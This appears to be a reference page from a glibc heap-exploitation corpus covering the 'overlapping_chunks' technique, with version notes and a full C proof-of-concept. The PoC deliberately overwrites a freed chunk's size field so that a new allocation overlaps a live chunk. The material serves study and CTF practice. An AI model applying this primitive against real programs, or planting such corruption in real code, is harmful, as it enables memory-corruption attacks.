# `overlapping_chunks`

## Summary

- Family: `Overlap And Consolidation`
- README summary: Exploit the overwrite of a freed chunk size in the unsorted bin in order to make a new allocation overlap with an existing chunk
- Core effect: overlap through freed-chunk size corruption.
- README applicability: `< 2.29`
- Solver window note: `2.23 -> 2.41`, but the README marks the classic form as `< 2.29`

## When To Consider It

- size corruption on a freed chunk that can still be reallocated across a live neighbor.

## Version Groups

- `2.23 -> 2.41`, but the README marks the classic form as `< 2.29`.

## Version Differences

- The family remains overlap-by-size-corruption across the corpus.
- The README marks the classic form as historically strongest before 2.29, so newer retained examples should be read as adapted demonstrations rather than proof that every old shortcut still exists unchanged.
- Always confirm whether the relevant corruption hits a freed chunk and whether the target size class still behaves as expected on the shipped libc.

## Representative Source Code

- Representative version: `glibc 2.41`

```c
/*

 A simple tale of overlapping chunk.
 This technique is taken from
 http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

int main(int argc , char* argv[])
{
	setbuf(stdout, NULL);

	long *p1,*p2,*p3,*p4;
	printf("\nThis is another simple chunks overlapping problem\n");
	printf("The previous technique is killed by patch: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n"
		   "which ensures the next chunk of an unsortedbin must have prev_inuse bit unset\n"
		   "and the prev_size of it must match the unsortedbin's size\n"
		   "This new poc uses the same primitive as the previous one. Theoretically speaking, they are the same powerful.\n\n");

	printf("Let's start to allocate 4 chunks on the heap\n");

	p1 = malloc(0x80 - 8);
	p2 = malloc(0x500 - 8);
	p3 = malloc(0x80 - 8);

	printf("The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

	memset(p1, '1', 0x80 - 8);
	memset(p2, '2', 0x500 - 8);
	memset(p3, '3', 0x80 - 8);

	printf("Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
	int evil_chunk_size = 0x581;
	int evil_region_size = 0x580 - 8;
	printf("We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
		 evil_chunk_size, evil_region_size);

	/* VULNERABILITY */
	*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
	/* VULNERABILITY */

	printf("\nNow let's free the chunk p2\n");
	free(p2);
	printf("The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");

	printf("\nNow let's allocate another chunk with a size equal to the data\n"
	       "size of the chunk p2 injected size\n");
	printf("This malloc will be served from the previously freed chunk that\n"
	       "is parked in the unsorted bin which size has been modified by us\n");
	p4 = malloc(evil_region_size);

	printf("\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
	printf("p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);
	printf("p4 should overlap with p3, in this case p4 includes all p3.\n");

	printf("\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
		   " and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");

	printf("Let's run through an example. Right now, we have:\n");
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
	memset(p4, '4', evil_region_size);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nAnd if we then memset(p3, '3', 80), we have:\n");
	memset(p3, '3', 80);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	assert(strstr((char *)p4, (char *)p3));
}
```

## Related Techniques

- `house_of_einherjar`
- `mmap_overlapping_chunks`
- `overlapping_chunks_2`
- `poison_null_byte`
